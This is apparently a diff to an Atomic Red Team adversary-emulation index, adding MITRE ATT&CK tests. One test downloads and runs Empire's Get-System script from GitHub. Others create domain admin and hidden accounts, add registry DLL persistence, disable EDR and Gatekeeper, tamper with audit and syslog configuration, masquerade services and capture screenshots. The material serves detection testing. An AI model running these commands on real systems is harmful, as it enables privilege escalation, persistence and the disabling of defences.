@@ -7582,7 +7582,34 @@ privilege-escalation:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1546.005:
     technique:
       external_references:
@@ -11084,7 +11111,62 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1136.002
+    atomic_tests:
+    - name: Create a new Windows domain admin user
+      auto_generated_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+      description: 'Creates a new domain admin user in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: T1136.002_Admin
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+        group:
+          description: Domain administrator group to which add the user to
+          type: String
+          default: Domain Admins
+      executor:
+        command: |
+          net user "#{username}" "#{password}" /add /domain
+          net group "#{group}" "#{username}" /add /domain
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
+    - name: Create a new account similar to ANONYMOUS LOGON
+      auto_generated_guid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+      description: 'Create a new account similar to ANONYMOUS LOGON in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: ANONYMOUS  LOGON
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+      executor:
+        command: 'net user "#{username}" "#{password}" /add /domain
+
+'
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
   T1078.002:
     technique:
       created: '2020-03-13T20:21:54.758Z'
@@ -13244,7 +13326,30 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.002
+    atomic_tests:
+    - name: Office Apllication Startup Test Persistence
+      auto_generated_guid: c3e35b58-fe1c-480b-b540-7600fb612563
+      description: |
+        Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
+        application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.
+      supported_platforms:
+      - windows
+      input_arguments:
+        thing_to_execute:
+          description: Thing to Run
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"
+          /t REG_SZ /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office
+          test\Special\Perf"
+
+'
+        name: command_prompt
   T1137.003:
     technique:
       external_references:
@@ -24054,7 +24159,36 @@ defense-evasion:
       x_mitre_data_sources:
       - API monitoring
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1006
+    atomic_tests:
+    - name: Read volume boot sector via DOS device path (PowerShell)
+      auto_generated_guid: 88f6327e-51ec-4bbf-b2e8-3fea534eab8b
+      description: |-
+        This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
+        On success, a hex dump of the first 11 bytes of the volume is displayed.
+
+        For a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):
+        ```
+                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+        00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
+        ```
+      supported_platforms:
+      - windows
+      input_arguments:
+        volume:
+          description: Drive letter of the volume to access
+          type: string
+          default: 'C:'
+      executor:
+        command: |
+          $buffer = New-Object byte[] 11
+          $handle = New-Object IO.FileStream "\\.\#{volume}", 'Open', 'Read', 'ReadWrite'
+          $handle.Read($buffer, 0, $buffer.Length)
+          $handle.Close()
+          Format-Hex -InputObject $buffer
+        name: powershell
+        elevation_required: true
   T1562.002:
     technique:
       external_references:
@@ -24464,10 +24598,14 @@ defense-evasion:
       supported_platforms:
       - macos
       executor:
-        command: 'sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
-
-'
+        command: |
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+        cleanup_command: |
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
         name: sh
+        elevation_required: true
     - name: Disable LittleSnitch
       auto_generated_guid: 62155dd8-bb3d-4f32-b31c-6532ff3ac6a3
       description: 'Disables LittleSnitch
@@ -24479,7 +24617,11 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+
+'
         name: sh
+        elevation_required: true
     - name: Disable OpenDNS Umbrella
       auto_generated_guid: 07f43b33-1e15-4e99-be70-bc094157c849
       description: 'Disables OpenDNS Umbrella
@@ -24491,7 +24633,27 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+
+'
         name: sh
+        elevation_required: true
+    - name: Disable macOS Gatekeeper
+      auto_generated_guid: 2a821573-fb3f-4e71-92c3-daac7432f053
+      description: 'Disables macOS Gatekeeper
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        command: 'sudo spctl --master-disable
+
+'
+        cleanup_command: 'sudo spctl --master-enable
+
+'
+        name: sh
+        elevation_required: true
     - name: Stop and unload Crowdstrike Falcon on macOS
       auto_generated_guid: b3e7510c-2d4c-4249-a33f-591a2bc83eef
       description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
@@ -24513,6 +24675,9 @@ defense-evasion:
         command: |
           sudo launchctl unload #{falcond_plist}
           sudo launchctl unload #{userdaemon_plist}
+        cleanup_command: |
+          sudo launchctl load -w #{falcond_plist}
+          sudo launchctl load -w #{userdaemon_plist}
         name: sh
         elevation_required: true
     - name: Unload Sysmon Filter Driver
@@ -25983,9 +26148,9 @@ defense-evasion:
           type: Path
           default: myapp.app
       executor:
-        command: |
-          sudo xattr -r -d com.apple.quarantine #{app_path}
-          sudo spctl --master-disable
+        command: 'sudo xattr -d com.apple.quarantine #{app_path}
+
+'
         elevation_required: true
         name: sh
   T1484:
@@ -26470,9 +26635,10 @@ defense-evasion:
       - macOS
       identifier: T1564.002
     atomic_tests:
-    - name: Hidden Users
+    - name: Create Hidden User using UniqueID < 500
       auto_generated_guid: 4238a7f0-a980-4fff-98a2-dfc0a363d507
-      description: 'Add a hidden user on MacOS
+      description: 'Add a hidden user on macOS using Unique ID < 500 (users with that
+        ID are hidden by default)
 
 '
       supported_platforms:
@@ -26484,6 +26650,27 @@ defense-evasion:
           default: APT
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
+
+'
+        cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
+
+'
+        elevation_required: true
+        name: sh
+    - name: Create Hidden User using IsHidden option
+      auto_generated_guid: de87ed7b-52c3-43fd-9554-730f695e7f31
+      description: 'Add a hidden user on macOS using IsHidden optoin
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        user_name:
+          description: username to add
+          type: string
+          default: APT
+      executor:
+        command: 'sudo dscl . -create /Users/#{user_name} IsHidden 1
 
 '
         cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
@@ -26816,7 +27003,86 @@ defense-evasion:
       - Anti-virus
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1562.006
+    atomic_tests:
+    - name: Auditing Configuration Changes on Linux Host
+      auto_generated_guid: 212cfbcf-4770-4980-bc21-303e37abd0e3
+      description: 'Emulates modification of auditd configuration files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        audisp_config_file_name:
+          description: The name of the audispd configuration file to be changed
+          type: string
+          default: audispd.conf
+        auditd_config_file_name:
+          description: The name of the auditd configuration file to be changed
+          type: string
+          default: auditd.conf
+        libaudit_config_file_name:
+          description: The name of the libaudit configuration file to be changed
+          type: string
+          default: libaudit.conf
+      executor:
+        command: "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif
+          [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1'
+          /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1'
+          /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1'
+          /etc/#{libaudit_config_file_name}\n"
+        cleanup_command: |
+          sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
+          if [ -f "/etc/#{auditd_config_file_name}" ];
+          then sed -i '$ d' /etc/#{auditd_config_file_name}
+          else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
+          fi
+          sed -i '$ d' /etc/#{libaudit_config_file_name}
+        name: bash
+        elevation_required: true
+    - name: Lgging Configuration Changes on Linux Host
+      auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
+      description: 'Emulates modification of syslog configuration.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        syslog_config_file_name:
+          description: The name of the syslog configuration file to be changed
+          type: string
+          default: syslog.conf
+        rsyslog_config_file_name:
+          description: The name of the rsyslog configuration file to be changed
+          type: string
+          default: rsyslog.conf
+        syslog_ng_config_file_name:
+          description: The name of the syslog-ng configuration file to be changed
+          type: string
+          default: syslog-ng.conf
+      executor:
+        command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        cleanup_command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        name: bash
+        elevation_required: true
   T1027.005:
     technique:
       id: attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92
@@ -27023,6 +27289,24 @@ defense-evasion:
         command: |
           forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
           forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
+        name: command_prompt
+    - name: Indirect Command Execution - conhost.exe
+      auto_generated_guid: cf3391e0-b482-4b02-87fc-ca8362269b29
+      description: |
+        conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.
+        Executing it through command line can create process ancestry anomalies
+        [Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)
+      supported_platforms:
+      - windows
+      input_arguments:
+        process:
+          description: Process to execute
+          type: string
+          default: notepad.exe
+      executor:
+        command: 'conhost.exe "#{process}"
+
+'
         name: command_prompt
   T1553.004:
     technique:
@@ -28569,7 +28853,38 @@ defense-evasion:
       x_mitre_platforms:
       - Windows
       - Linux
-    atomic_tests: []
+      identifier: T1036.004
+    atomic_tests:
+    - name: Creating W32Time similar named service using schtasks
+      auto_generated_guid: f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9
+      description: Creating W32Time similar named service (win32times) using schtasks
+        just like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
+          schtasks /query /tn win32times
+        cleanup_command: 'schtasks /tn win32times /delete /f
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Creating W32Time similar named service using sc
+      auto_generated_guid: b721c6ef-472c-4263-a0d9-37f1f4ecff66
+      description: Creating W32Time similar named service (win32times) using sc just
+        like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"
+          sc qc win32times
+        cleanup_command: 'sc delete win32times
+
+'
+        name: command_prompt
+        elevation_required: true
   T1036:
     technique:
       id: attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0
@@ -34332,7 +34647,60 @@ defense-evasion:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1542.001:
     technique:
       id: attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada
@@ -35006,7 +35374,34 @@ defense-evasion:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1205:
     technique:
       revoked: false
@@ -40984,7 +41379,60 @@ discovery:
       - Signature-based detection
       - Host forensic analysis
       - Anti-virus
-    atomic_tests: []
+      identifier: T1497.001
+    atomic_tests:
+    - name: Detect Virtualization Environment (Linux)
+      auto_generated_guid: dfbd1a21-540d-4574-9731-e852bd6fe840
+      description: |
+        systemd-detect-virt detects execution in a virtualized environment.
+        At boot, dmesg stores a log if a hypervisor is detected.
+      supported_platforms:
+      - linux
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'if (systemd-detect-virt || sudo dmidecode | egrep -i ''manufacturer|product|vendor''
+          | grep -iE ''Oracle|VirtualBox|VMWare|Parallels'') then echo "Virtualization
+          Environment detected"; fi;
+
+'
+    - name: Detect Virtualization Environment (Windows)
+      auto_generated_guid: 502a7dc4-9d6f-4d28-abf2-f0e84692562d
+      description: 'Windows Management Instrumentation(WMI) objects contains system
+        information which helps to detect virtualization. This command will specifically
+        attempt to get the CurrentTemperature value from this object and will check
+        to see if the attempt results in an error that contains the word supported.
+        This is meant to find the result of Not supported, which is the result if
+        run in a virtual machine
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          $error.clear()
+          Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue
+          if($error) {echo "Virtualization Environment detected"}
+        cleanup_command: "$error.clear()\n"
+    - name: Detect Virtualization Environment (MacOS)
+      auto_generated_guid: a960185f-aef6-4547-8350-d1ce16680d09
+      description: 'ioreg contains registry entries for all the device drivers in
+        the system. If it''s a virtual machine, one of the device manufacturer will
+        be a Virtualization Software.
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'if (ioreg -l | grep -e Manufacturer -e ''Vendor Name'' | grep -iE
+          ''Oracle|VirtualBox|VMWare|Parallels'') then echo ''Virtualization Environment
+          detected''; fi;
+
+'
   T1082:
     technique:
       created: '2017-05-31T21:31:04.307Z'
@@ -51938,6 +52386,32 @@ collection:
 
 '
         name: bash
+    - name: Windows Screencapture
+      auto_generated_guid: 3c898f62-626c-47d5-aad2-6de873d69153
+      description: 'Use Psr.exe binary to collect screenshots of user display. Test
+        will do left mouse click to simulate user behaviour
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: Path
+          default: c:\temp\T1113_desktop.zip
+        recording_time:
+          description: Time to take screenshots
+          type: String
+          default: 5
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12
+          Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
+          [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);
+          cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
+        cleanup_command: 'rm #{output_file}'
   T1213.002:
     technique:
       external_references:
